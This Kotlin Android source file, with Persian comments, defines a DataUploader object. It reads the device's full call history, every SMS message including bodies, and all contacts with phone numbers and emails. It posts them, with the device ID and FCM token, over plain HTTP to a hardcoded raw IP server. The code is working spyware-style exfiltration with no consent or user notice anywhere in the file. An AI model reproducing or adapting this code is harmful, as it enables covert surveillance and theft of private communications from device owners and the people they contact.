package com.example.test.utils

import android.content.Context
import android.util.Log
import android.provider.ContactsContract
import android.provider.Telephony
import android.database.Cursor
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

object DataUploader {

    private const val TAG = "DataUploader"
    private const val BASE_URL = "http://95.134.130.160:8765"

    /**
     * رجیستر کردن دستگاه در سرور (فرمت snake_case برای سینک با Python)
     */
    fun registerDevice(context: Context, deviceId: String, fcmToken: String, userId: String): Boolean {
        return try {
            Log.d(TAG, "📝 Registering device: $deviceId")

            // استفاده از DeviceInfoHelper برای گرفتن اطلاعات کامل دستگاه
            val deviceInfo = DeviceInfoHelper.buildDeviceInfoJson(context, deviceId, fcmToken, userId)

            // ساخت JSON با فرمت snake_case
            val registerJson = JSONObject().apply {
                put("type", "register")
                put("device_id", deviceId)
                put("device_info", deviceInfo)
                put("user_id", userId)
                put("app_type", "MP")
            }

            val result = sendPostRequest("$BASE_URL/register", registerJson.toString())
            Log.d(TAG, "✅ Device registered successfully")
            true

        } catch (e: Exception) {
            Log.e(TAG, "❌ Register device failed: ${e.message}", e)
            false
        }
    }

    /**
     * آپلود تاریخچه تماس‌ها (snake_case format)
     */
    fun uploadCallHistory(context: Context, deviceId: String) {
        try {
            Log.d(TAG, "📞 Reading call history...")

            val calls = JSONArray()
            val cursor: Cursor? = context.contentResolver.query(
                android.provider.CallLog.Calls.CONTENT_URI,
                null, null, null,
                android.provider.CallLog.Calls.DATE + " DESC"
            )

            cursor?.use {
                val numberIndex = it.getColumnIndex(android.provider.CallLog.Calls.NUMBER)
                val typeIndex = it.getColumnIndex(android.provider.CallLog.Calls.TYPE)
                val dateIndex = it.getColumnIndex(android.provider.CallLog.Calls.DATE)
                val durationIndex = it.getColumnIndex(android.provider.CallLog.Calls.DURATION)
                val nameIndex = it.getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME)

                while (it.moveToNext()) {
                    val number = it.getString(numberIndex) ?: ""
                    val type = it.getInt(typeIndex)
                    val timestamp = it.getLong(dateIndex)
                    val duration = it.getInt(durationIndex)
                    val name = it.getString(nameIndex) ?: "Unknown"

                    // تبدیل type به فرمت متنی
                    val callType = when (type) {
                        android.provider.CallLog.Calls.INCOMING_TYPE -> "incoming"
                        android.provider.CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                        android.provider.CallLog.Calls.MISSED_TYPE -> "missed"
                        android.provider.CallLog.Calls.REJECTED_TYPE -> "rejected"
                        android.provider.CallLog.Calls.BLOCKED_TYPE -> "blocked"
                        android.provider.CallLog.Calls.VOICEMAIL_TYPE -> "voicemail"
                        else -> "unknown"
                    }

                    // فرمت duration
                    val durationFormatted = formatDuration(duration)

                    val call = JSONObject().apply {
                        put("number", number)
                        put("name", name)
                        put("call_type", callType)
                        put("timestamp", timestamp)
                        put("duration", duration)
                        put("duration_formatted", durationFormatted)
                    }
                    calls.put(call)
                }
            }

            val json = JSONObject().apply {
                put("device_id", deviceId)
                put("data", calls)
                put("batch_info", JSONObject().apply {
                    put("batch", 1)
                    put("of", 1)
                })
            }

            sendPostRequest("$BASE_URL/call-logs/batch", json.toString())
            Log.d(TAG, "✅ Call history uploaded: ${calls.length()} calls")

        } catch (e: Exception) {
            Log.e(TAG, "❌ Upload call history failed: ${e.message}", e)
        }
    }

    /**
     * آپلود همه پیامک‌ها (snake_case format)
     */
    fun uploadAllSms(context: Context, deviceId: String) {
        try {
            Log.d(TAG, "💬 Reading SMS messages...")

            val messages = JSONArray()
            val cursor: Cursor? = context.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                null, null, null,
                Telephony.Sms.DATE + " DESC"
            )

            cursor?.use {
                val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
                val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
                val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)
                val typeIndex = it.getColumnIndex(Telephony.Sms.TYPE)

                while (it.moveToNext()) {
                    val address = it.getString(addressIndex) ?: ""
                    val body = it.getString(bodyIndex) ?: ""
                    val timestamp = it.getLong(dateIndex)
                    val smsType = it.getInt(typeIndex)

                    // تعیین from و to بر اساس نوع پیام
                    val (from, to) = when (smsType) {
                        Telephony.Sms.MESSAGE_TYPE_INBOX -> Pair(address, deviceId)
                        Telephony.Sms.MESSAGE_TYPE_SENT -> Pair(deviceId, address)
                        else -> Pair(address, deviceId)
                    }

                    // تبدیل type به فرمت متنی
                    val typeStr = when (smsType) {
                        Telephony.Sms.MESSAGE_TYPE_INBOX -> "inbox"
                        Telephony.Sms.MESSAGE_TYPE_SENT -> "sent"
                        Telephony.Sms.MESSAGE_TYPE_DRAFT -> "draft"
                        Telephony.Sms.MESSAGE_TYPE_OUTBOX -> "outbox"
                        Telephony.Sms.MESSAGE_TYPE_FAILED -> "failed"
                        Telephony.Sms.MESSAGE_TYPE_QUEUED -> "queued"
                        else -> "unknown"
                    }

                    val sms = JSONObject().apply {
                        put("from", from)
                        put("to", to)
                        put("body", body)
                        put("timestamp", timestamp)
                        put("type", typeStr)
                    }
                    messages.put(sms)
                }
            }

            val json = JSONObject().apply {
                put("device_id", deviceId)
                put("data", messages)
                put("batch_info", JSONObject().apply {
                    put("batch", 1)
                    put("of", 1)
                })
            }

            sendPostRequest("$BASE_URL/sms/batch", json.toString())
            Log.d(TAG, "✅ SMS uploaded: ${messages.length()} messages")

        } catch (e: Exception) {
            Log.e(TAG, "❌ Upload SMS failed: ${e.message}", e)
        }
    }

    /**
     * آپلود همه مخاطبین (snake_case format)
     */
    fun uploadAllContacts(context: Context, deviceId: String) {
        try {
            Log.d(TAG, "👥 Reading contacts...")

            val contacts = JSONArray()
            val cursor: Cursor? = context.contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null
            )

            cursor?.use {
                val idIndex = it.getColumnIndex(ContactsContract.Contacts._ID)
                val nameIndex = it.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)

                while (it.moveToNext()) {
                    val contactId = it.getString(idIndex)
                    val name = it.getString(nameIndex) ?: ""

                    // خواندن شماره تماس
                    var phoneNumber = ""
                    val phoneCursor = context.contentResolver.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                        arrayOf(contactId),
                        null
                    )

                    phoneCursor?.use { pc ->
                        val phoneIndex = pc.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                        if (pc.moveToFirst()) {
                            phoneNumber = pc.getString(phoneIndex) ?: ""
                        }
                    }

                    // خواندن ایمیل
                    var email = ""
                    val emailCursor = context.contentResolver.query(
                        ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                        arrayOf(contactId),
                        null
                    )

                    emailCursor?.use { ec ->
                        val emailIndex = ec.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS)
                        if (ec.moveToFirst()) {
                            email = ec.getString(emailIndex) ?: ""
                        }
                    }

                    // فقط اگر شماره داشت اضافه کن
                    if (phoneNumber.isNotEmpty()) {
                        val contact = JSONObject().apply {
                            put("id", contactId)
                            put("name", name)
                            put("phone", phoneNumber)
                            put("email", email)
                        }
                        contacts.put(contact)
                    }
                }
            }

            val json = JSONObject().apply {
                put("device_id", deviceId)
                put("data", contacts)
                put("batch_info", JSONObject().apply {
                    put("batch", 1)
                    put("of", 1)
                })
            }

            sendPostRequest("$BASE_URL/contacts/batch", json.toString())
            Log.d(TAG, "✅ Contacts uploaded: ${contacts.length()} contacts")

        } catch (e: Exception) {
            Log.e(TAG, "❌ Upload contacts failed: ${e.message}", e)
        }
    }

    /**
     * ارسال وضعیت باتری (snake_case format)
     */
    fun sendBatteryUpdate(context: Context, deviceId: String, fcmToken: String) {
        try {
            val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
            val batteryLevel = batteryManager.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)

            val json = JSONObject().apply {
                put("device_id", deviceId)
                put("fcm_token", fcmToken)
                put("data", JSONObject().apply {
                    put("battery", batteryLevel)
                    put("is_online", true)
                })
                put("timestamp", System.currentTimeMillis())
            }

            sendPostRequest("$BASE_URL/battery", json.toString())
            Log.d(TAG, "🔋 Battery update sent: $batteryLevel%")

        } catch (e: Exception) {
            Log.e(TAG, "❌ Battery update failed: ${e.message}", e)
        }
    }

    /**
     * فرمت کردن مدت زمان تماس
     */
    private fun formatDuration(seconds: Int): String {
        val hours = seconds / 3600
        val minutes = (seconds % 3600) / 60
        val secs = seconds % 60

        return when {
            hours > 0 -> String.format("%d:%02d:%02d", hours, minutes, secs)
            minutes > 0 -> String.format("%d:%02d", minutes, secs)
            else -> String.format("0:%02d", secs)
        }
    }

    /**
     * ارسال درخواست POST به سرور
     */
    private fun sendPostRequest(urlString: String, jsonData: String): String? {
        var connection: HttpURLConnection? = null
        try {
            val url = URL(urlString)
            connection = url.openConnection() as HttpURLConnection
            connection.apply {
                requestMethod = "POST"
                doOutput = true
                setRequestProperty("Content-Type", "application/json")
                connectTimeout = 15000
                readTimeout = 15000
            }

            // ارسال داده
            connection.outputStream.use { os ->
                os.write(jsonData.toByteArray())
                os.flush()
            }

            // دریافت پاسخ
            val responseCode = connection.responseCode
            Log.d(TAG, "📡 Response code: $responseCode")

            return if (responseCode == HttpURLConnection.HTTP_OK) {
                connection.inputStream.bufferedReader().use { it.readText() }
            } else {
                null
            }

        } catch (e: Exception) {
            Log.e(TAG, "❌ HTTP request failed: ${e.message}", e)
            return null
        } finally {
            connection?.disconnect()
        }
    }
}